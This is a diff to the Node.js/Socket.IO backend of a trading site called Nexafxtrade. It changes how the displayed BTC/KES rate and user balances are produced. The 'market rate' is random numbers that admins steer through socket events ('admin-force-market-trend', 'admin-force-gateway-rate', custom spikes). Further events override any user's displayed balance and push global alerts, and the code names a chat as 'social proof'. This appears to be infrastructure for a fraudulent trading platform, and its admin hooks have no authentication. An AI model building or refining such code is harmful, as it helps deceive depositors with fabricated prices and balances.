@@ -1,6 +1,6 @@
 /**
  * Nexafxtrade Backend Engine
- * Version: 3.1.0 (May 2026)
+ * Version: 3.1.5 (May 2026)
  * Brand: Nexafxtrade (formerly Nexapaytrade)
  */
 
@@ -28,8 +28,8 @@ app.use(cors());
 app.use(express.json());
 
 // Global Market State
-let currentMarketRate = 0.0000;
-let forcedAdminTrend = "AUTO"; // Tracks admin panel chart manipulation parameters
+let currentMarketRate = 8421500; // Updated to match your default KES base rate sequence
+let forcedAdminTrend = "AUTO";   // Tracks admin panel chart manipulation parameters
 
 // Main brand identification
 app.get("/", (req, res) => {
@@ -58,6 +58,7 @@ io.on("connection", (socket) => {
 
   // Sync current administration configuration parameters with new incoming pipelines
   socket.emit('admin-force-market-trend', { trend: forcedAdminTrend });
+  socket.emit('market-update', { rate: currentMarketRate });
 
   // 1. CHAT & SOCIAL PROOF
   socket.on("send-chat", (data) => {
@@ -68,9 +69,38 @@ io.on("connection", (socket) => {
     });
   });
 
-  // 2. ADMIN INTERCEPT CONTROL HOOKS
-  // Listens for direct trends adjustments pushed from the administration control room
-  socket.on("admin-control-trend", (data) => {
+  // 2. ADMIN PANEL INTERCEPT CONTROL HOOKS
+  
+  // NEW: Receives direct dashboard manual inputs for Gateway Base Rate and applies them globally
+  socket.on("admin-force-gateway-rate", (data) => {
+    if (data && typeof data.rate === 'number') {
+      currentMarketRate = Math.floor(data.rate);
+      console.log(`CRITICAL: Admin updated Gateway Base Rate to BTC/KES ${currentMarketRate}`);
+      
+      // Broadcast update immediately to all connected frontends (Main Website & Admin Panels)
+      io.emit("market-update", { 
+        rate: currentMarketRate,
+        timestamp: data.timestamp || new Date().toISOString()
+      });
+    }
+  });
+
+  // NEW: Captures multi-parameter configuration payload sync matrix from Admin Panel
+  socket.on("admin-matrix-sync", (data) => {
+    if (data && data.marketTrend) {
+      forcedAdminTrend = data.marketTrend;
+      console.log(`System Configuration Synced. Market Trend Overridden to: ${forcedAdminTrend}`);
+      io.emit("admin-force-market-trend", { trend: forcedAdminTrend });
+      
+      if (data.customSpikeRate !== '' && !isNaN(data.customSpikeRate)) {
+        currentMarketRate += parseFloat(data.customSpikeRate);
+        io.emit("market-update", { rate: currentMarketRate });
+      }
+    }
+  });
+
+  // Listens for direct trend adjustment tags pushed from Admin panel control hub buttons
+  socket.on("admin-force-market-trend", (data) => {
     if (data && data.trend) {
       forcedAdminTrend = data.trend;
       io.emit("admin-force-market-trend", { trend: forcedAdminTrend });
@@ -78,21 +108,54 @@ io.on("connection", (socket) => {
     }
   });
 
-  // Forces direct manual adjustments to any chosen target socket node balance parameters
+  // Backward compatible hook: Listens to old trend override endpoint structure 
+  socket.on("admin-control-trend", (data) => {
+    if (data && data.trend) {
+      forcedAdminTrend = data.trend;
+      io.emit("admin-force-market-trend", { trend: forcedAdminTrend });
+      console.log(`Admin override deployed (via admin-control-trend endpoint): ${forcedAdminTrend}`);
+    }
+  });
+
+  // Forces direct manual balance modification down targeted socket nodes or text handles
+  socket.on("admin-force-balance", (data) => {
+    if (data && data.user && typeof data.balance === 'number') {
+      console.log(`Balance Override processing for account ${data.user} to KES ${data.balance}`);
+      // Emits global adjustment broadcast targeted for processing inside client scripts
+      io.emit("admin-force-balance", { 
+        user: data.user, 
+        balance: data.balance,
+        timestamp: data.timestamp || new Date().toISOString()
+      });
+    }
+  });
+
+  // Fallback structural compatibility endpoint for target socket node adjustments
   socket.on("admin-control-balance", (data) => {
     if (data && data.targetSocketId && typeof data.balance === 'number') {
       io.to(data.targetSocketId).emit("admin-force-balance", { balance: data.balance });
     }
   });
 
-  // Emits manual prompt alerts globally to all open window applications
+  // Emits manual emergency global alert notifications to all active window views
+  socket.on("admin-global-broadcast", (data) => {
+    if (data && data.msg) {
+      console.log(`System broadcast notification dispatched: "${data.msg}"`);
+      io.emit("admin-global-broadcast", { 
+        msg: data.msg,
+        expiry: data.expiry || 300
+      });
+    }
+  });
+
+  // Fallback compatibility for general administrative global notifications
   socket.on("admin-control-broadcast", (data) => {
     if (data && data.msg) {
       io.emit("admin-global-broadcast", { msg: data.msg });
     }
   });
 
-  // Tracks active calculations streaming upwards from index.html client runtime engine loop iterations
+  // Tracks updates cascading upwards from front-end layout executions if applicable
   socket.on("market-update", (data) => {
     if (data && typeof data.rate === 'number') {
       currentMarketRate = data.rate;
@@ -139,20 +202,23 @@ io.on("connection", (socket) => {
 });
 
 /**
- * MARKET RATE GENERATOR (Wavy Movement)
+ * MARKET RATE GENERATOR (Wavy Movement Simulation Matrix)
  */
 setInterval(() => {
   // Only execute natural generator loops if an admin override is not running
   if (forcedAdminTrend === "AUTO") {
-    // Generates movement between -0.12 and 0.12
-    const movement = (Math.random() * 0.24 - 0.12).toFixed(4);
-    currentMarketRate = parseFloat(movement);
+    // Generates localized movement shifts appropriate for high KES rate numbers
+    const dynamicShift = (Math.random() - 0.48) * (8000 / 15);
+    currentMarketRate = Math.floor(currentMarketRate + dynamicShift);
   } else if (forcedAdminTrend === "HIGH") {
-    currentMarketRate += parseFloat((Math.random() * 0.15 + 0.05).toFixed(4));
+    const dynamicShift = (Math.random() * (45000 / 15)) + 1800;
+    currentMarketRate = Math.floor(currentMarketRate + dynamicShift);
   } else if (forcedAdminTrend === "LOW") {
-    currentMarketRate -= parseFloat((Math.random() * 0.15 + 0.05).toFixed(4));
+    const dynamicShift = -((Math.random() * (45000 / 15)) + 1800);
+    currentMarketRate = Math.floor(currentMarketRate + dynamicShift);
   }
   
+  // Emits real-time ticker stream updates continuously to all clients every second
   io.emit("market-update", { rate: currentMarketRate });
 }, 1000);
 
